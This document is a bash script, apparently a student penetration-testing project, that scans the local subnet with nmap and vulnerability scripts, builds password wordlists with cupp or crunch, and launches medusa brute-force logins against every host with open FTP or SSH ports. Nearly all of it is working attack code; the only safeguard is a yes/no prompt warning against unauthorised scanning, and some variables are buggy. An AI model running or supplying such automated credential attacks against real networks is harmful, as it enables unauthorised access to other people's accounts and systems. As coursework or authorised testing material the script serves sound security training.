#!/bin/bash

# This script will help you map the network and find different attack vectors.
# Created by Liray Spilberg 
# Hmagen773616
# Lecturer - Eliran Berkovich


# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'  # Reset text formatting

# Checking if the current user is sudo
if [[ $(id -u) -ne 0 ]]; 
  then
    echo "This script requires sudo privileges. Please run it with sudo."
    exit 1
fi


echo -e "${GREEN} Welcome to the vulner automated mapping script ${BLUE}                                                                                                    
                                                                                                    
                                                                                                    
                     ..........:--::::--==:........  ........................                       
                    .::-=--=+++::=+@@@@@@%......::.  ...:-:...:+*%*-....:::..                       
       ....*#@@%#*#%#*#%*+%++=%*..=@@@#*-...  ..-#%%*+.-++*##*@@@@@@@@@@@@@@@@%**#%*=:..            
     ...+%%%%@@@@@@@@@@@*-:-*==...=#-....:....-%@#*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##@%-..            
     ..::....=@@@@@@@@@@#--%@@%-...........:*:.++=#@@@@@@@@@@@@@@@@@@@@@@@@@@@=...#@:...            
     ...... .-#@@@@@@@@@@@@@@++*.       ....+*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+:......            
          ...%@@@@@@@@@@@@@==:...       ...=+@#**#@@%::*@*+@@@@@@@@@@@@@@@@@@@@%-:+.                
          ..*@@@@@@@@@@@%:..            ..:%#-----:=*@%@@@+%@@@@@@@@@@@@@@@@#==*.:%..               
          ...#@@@@@@@@@-..             ...=@@@@@#-=+::=@@@@@@@@@@@@@@@@@@@@@@@-.-:...               
            .==@@@....+               ...#@@@@@@@@@@@@*%@@%-+%%@@@@@@@@@@@@@@@=...                  
            ...#@#.=+..+::..          ..%@@@@@@@@@@@@@@+%@@@@*..-*@@@+.%@@@==.....                  
               ...=@@:......          ..@@@@@@@@@@@@@@@@+%%:.. ..:@#.. .-@@@...=..                  
               .....:++%%@@*..        ...%@@@@@@@@@@@@@@@@@=.   ..:#:. ..=:-....*.                  
                    ..=@@@@@@@=..       .......-@@@@@@@@@@+..     .... .-=+..%*......               
                    .:@@@@@@@@@@*+..          .-@@@@@@@@%..            ..:%:-#-*:-:+#+.......       
                    ..#@@@@@@@@@@@%.          ..+@@@@@@@=....           ...:---:-::.:#+=..-..       
                    ...*@@@@@@@@@@:.          ..*@@@@@@@#.=:.             ......-+@*.*:......       
                       ..#@@@@@@@%..          ..=@@@@@@:.**...            ...:=%@@@@@@#...         
                       ..*@@@@@#.               .@@@@@=..=..              ..=@@@@@@@@@@+..          
                       ..+@@@@@..               .:@@@-.....               ..+@@#*#@@@@#........     
                       ..+@@@*...               ......                    ........=%*-..  .:=..     
                         .#@-..                                                  ..-....---....     
                         .=@+..                                                                     
                         ...-:.                                                                     
                                


 ${RESET}"

# Create a directory to store mapping results
vulner_dir="vulner_results"
mkdir -p "$vulner_dir"

# Define the report file
report_file="$vulner_dir/report.txt"
echo -e "${RED}Mapping completed on: $(date)" >> "$report_file"


# Checking if cupp is installed and if not, installing it function
cupp_check() {
if ! command -v cupp &>/dev/null; 
    then
        echo -e "${BLUE}[+]:${RESET}CUPP..."
        sudo apt update >/dev/null 2>&1 
        sudo apt install cupp -y >/dev/null 2>&1
        echo "cupp has been installed" | tee -a "$report_file"
fi


cupp -i

read -p "Please enter the saved wordlist name:" pass_list

}


# Checking if crunch is installed and if not, installing it function
crunch_check() {
if ! command -v crunch &>/dev/null; 
    then
        echo -e "${BLUE}[+]:${RESET}CRUNCH..."
        sudo apt update >/dev/null 2>&1 
        sudo apt install crunch -y >/dev/null 2>&1
        echo "crunch has been installed" | tee -a "$report_file"
fi

echo "A quick guide to refresh your memory:"
echo -e "${BLUE}[+]:${RESET}usage: crunch <min_length_number> <max_length_number> [-options]"
echo "-t is pattern where: @=lower case letters ; ,=upper case letters ; %=numbers ; ^=special characters"
echo "-i is to invert the characters order"
echo "example: crunch 8 8 -t @,%^ -o wordlist.txt"
read -p "Please enter a minimun length:" min
read -p "Please enter a max length:" max
read -p "Please enter the desired pattern using the symbols above:" pattern
read -p "Would you like to invert? y/n" invert

if [ "$invert" == "y" ];
	  then 
      crunch "$min" "$max" "$pattern" -i -o crunch.txt  | tee -a "$report_file"
	  else 
      crunch "$min" "$max" "$pattern"  -o crunch.txt  | tee -a "$report_file"
fi

echo -e "${BLUE}[+]:${RESET}Wordlist is saved as crunch.txt" 

pass_list="$crunch.txt"

}



# # Checking if medusa is installed and if not, installing it 
medusa_check() {
if ! command -v medusa &>/dev/null; 
    then
        echo -e "${BLUE}[+]:${RESET}Installing medusa"
        sudo apt-get update >/dev/null 2>&1 
        sudo apt-get install medusa -y >/dev/null 2>&1
        echo -e "${BLUE}[+]:${RESET}medusa has been installed" | tee -a "$report_file"
fi

}


# Get the LAN ip's subnet
LAN=$(ip a | grep  -w inet | awk '{print $2}' | tail -n 1)
echo -e "${GREEN} The Scanned LAN is '$LAN'${RESET}" | tee -a "$report_file"


# TCP scan:
TCP_scan() {

echo -e "${GREEN}[+]${RESET}Scanning the network $LAN on TCP ports" | tee -a "$report_file"

cd "$vulner_dir"
nmap -A  --reason --script /usr/share/nmap/scripts/vulners.nse "$LAN" -oN lanscan.txt -oX lanscan.xml 
echo -e "${BLUE}[+]${RESET}NMAP TCP SCAN HAS DONE SUCCSSFULLY" | tee -a ../"$report_file"

stats=$(cat lanscan.txt | tail -n 1 )

echo -e "${BLUE}[+]${RESET} $stats" >> ../"$report_file"

# Define the input text file
input_file="lanscan.txt"

# Create a directory to store the results
mkdir -p nmap_results

# Parse the Nmap text output and split it into separate files by IP address
while read -r line; 
  do
    if [[ $line =~ "Nmap scan report for "([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; 
      then
          ip="${BASH_REMATCH[1]}"
          echo "$line" > "nmap_results/${ip}.txt"
    elif [[ -n $ip ]]; 
      then
          echo "$line" >> "nmap_results/${ip}.txt"
    fi
done < "$input_file"

echo -e "${BLUE}[+]${RESET} Results have been split into separate files by IP address with '.txt' extension."


}



# All ports scan:
all_ports_scan() {

echo -e "${GREEN}[+]${RESET}Scanning the network $LAN on ALL ports"  | tee -a ../"$report_file"

cd "$vulner_dir"
nmap -A -p- --reason --script /usr/share/nmap/scripts/vulners.nse "$LAN" -oN lanscan.txt -oX lanscan.xml  
echo -e "${BLUE}[+]${RESET}NMAP ALL PORT SCAN HAS DONE SUCCSSFULLY" | tee -a ../"$report_file"

stats=$(cat lanscan.txt | tail -n 1 | cut -d ":" -f 2)

echo -e "${BLUE}[+]${RESET}Scanned $stats" >> ../"$report_file"

# Define the input text file
input_file="lanscan.txt"

# Create a directory to store the results
mkdir -p nmap_results

# Parse the Nmap text output and split it into separate files by IP address
while read -r line; 
  do
    if [[ $line =~ "Nmap scan report for "([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; 
      then
          ip="${BASH_REMATCH[1]}"
          echo "$line" > "nmap_results/${ip}.txt"
    elif [[ -n $ip ]];
      then
         echo "$line" >> "nmap_results/${ip}.txt"
    fi
done < "$input_file"

echo -e "${BLUE}[+]${RESET} Results have been split into separate files by IP address with '.txt' extension."

}

# Calling the functions that are needed based on the user's choice:
lets_start() {
while true; 
  do
    echo -e "${BLUE}[+]${RESET}Choose your preferred scanning:"
    echo "a) TCP ports"
    echo "b) ALL ports"
    read -p "Enter choice here:" scan_type

  # Convert the user's input to lowercase using the `tr` command
  scan_type=$(echo "$scan_type" | tr '[:upper:]' '[:lower:]')

  if [ "$scan_type" == "a" ]; 
    then
      TCP_scan
      break
  elif [ "$scan_type" == "b" ];
     then
      all_ports_scan
      break
    else
      echo "Invalid choice. Please choose a valid option."
  fi
done
}


# Making sure it is ok to scan the whole LAN
echo -e "${GREEN}[+]${RESET}Vulen will now scan your LAN network range."
echo -e "${RED}CAUTION!!! IF YOU ARE NOT ALLOWED TO SCAN THE WHOLE NETWORK DO NOT CONTINUE ${RESET}"

read -p "Do you wish to continue? Y/N:" answer

# Convert the user's input to lowercase using the `tr` command
answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')

if [ "$answer" == "n" ] ; 
	then exit
	else lets_start
fi



# Fetching open ports for ssh and ftp
open_ftp_port=$(cat lanscan.txt | grep open | grep ftp | grep -oE '[0-9]+' | head -n 1)
open_ssh_port=$(cat lanscan.txt | grep open | grep ssh | grep -oE '[0-9]+' | head -n 1)



# Allowing the user to create a password list:
new_pass_list() {

echo -e "${BLUE}[+]${RESET}You chose to  create a new password list!"
echo -e "${RED}[+]${RESET}NOTE: CUPP is used for a personal profile password list while CRUNCH is better for generating a patterne followed password list. CHOOSE WISELY" 
read -p "Please choose a tool you'd wish to use for generating a new password list: cupp/crunch:" tool

# Convert the user's input to lowercase using the `tr` command
tool=$(echo "$tool" | tr '[:upper:]' '[:lower:]')


if [ "$tool" == "cupp" ];
	then 
    cupp_check
	  echo -e "${BLUE}[+]${RESET}You have chosen to generate a new wordlist using cupp, results are saved under $pass_list" >> "$report_file"
	else crunch_check
	  echo -e "${BLUE}[+]${RESET}You have chosen to generate a new wordlist using crunch, results are saved under crunch.txt" >> "$report_file"
fi

}

# Getting usernames and password list from user:
current_dir="$(pwd)"
echo -e "${BLUE}[+]${RESET}Your current directory is: $current_dir"
read -p "Please enter a username list file path:" username_list
echo -e "${BLUE}[+]${RESET}Would you like to use an existing password list or generate a new one?"
echo -e "a) existing passwords list"
echo -e "b) generate a new one"
read -p "Please choose a or b:" list_answer

if [ "$list_answer" == "b" ]; 
  then
    new_pass_list
  else
    read -p "Please enter a password list file path:" pass_list
fi

echo -e "${BLUE}[+]${RESET} Username list chosen for brute-force is $username_list" >> ./report.txt
echo -e "${BLUE}[+]${RESET} Password list chosen for brute-force is $pass_list" >> ./report.txt

# Checking which port is first on the list by checking who is smaller while making sure neither is empty (closed)
if [ -n "$open_ftp_port" ] && [ -n "$open_ssh_port" ]; 
  then
    # Both variables are not empty, so compare them
    if [ "$open_ftp_port" -lt "$open_ssh_port" ]; 
      then
          echo -e "${BLUE}[+]${RESET}the ftp port is first on the result list" 
          echo -e "${BLUE}[+]${RESET}Starting brute-force on $open_ftp_port port using medusa" 
          medusa_check
        	cat lanscan.txt | grep  -s -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > target.txt	
	        medusa -H target.txt -U "$username_list" -P "$pass_list" -M ftp -n "$open_ftp_port" -O medusa.txt
	        echo -e "${BLUE}[+]${RESET}Results are saved into - medusa.txt" | tee -a ./report.txt       
      else
          echo -e "${BLUE}[+]${RESET}the ssh port is first on the result list" | tee -a ./report.txt
          echo -e "${BLUE}[+]${RESET}Starting brute-force on $open_ssh_port port using medusa" | tee -a ./report.txt
          medusa_check
	        cat lanscan.txt | grep  -s -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > target.txt
	        medusa -H target.txt -U "$username_list" -P "$pass_list" -M ssh -n "$open_ssh_port" -O medusa.txt
	        echo -e "${BLUE}[+]${RESET}Results are saved into - medusa.txt" | tee -a ./report.txt 
	    fi
      
elif [ -n "$open_ftp_port" ] && [ -z "$open_ssh_port" ]; 
    then
          echo "SSH open port was not found"
          echo -e "${BLUE}[+]${RESET}Starting brute-force on $open_ftp_port port using medusa" | tee -a ./report.txt
          medusa_check
          cat lanscan.txt | grep  -s -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > target.txt
	        medusa -H target.txt -U "$username_list" -P "$pass_list" -M ftp -n "$open_ftp_port" -O medusa.txt
	        echo -e "${BLUE}[+]${RESET}Results are saved into - medusa.txt" | tee -a ./report.txt 
elif [ -z "$open_ftp_port" ] && [ -n "$open_ssh_port" ]; 
      then
          echo "FTP open port was not found"
          echo -e "${BLUE}[+]${RESET}Starting brute-force on $open_ssh_port port using medusa" | tee -a ./report.txt
          medusa_check
          cat lanscan.txt | grep  -s -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > target.txt
	        medusa -H target.txt -U "$username_list" -P "$pass_list" -M ssh -n "$open_ssh_port" -O medusa.txt
	        echo -e "${BLUE}[+]${RESET}Results are saved into - medusa.txt" | tee -a ./report.txt 
      else
          echo "${RED}[+]${RESET}Both FTP and SSH ports are not seemed to be open" | tee -a ./report.txt
fi


# Displaying a chosen IP result for user:
cd nmap_results
ls -la
read -p "Please select an IP address to check it's output file scan result:"  IP
open "$IP".txt
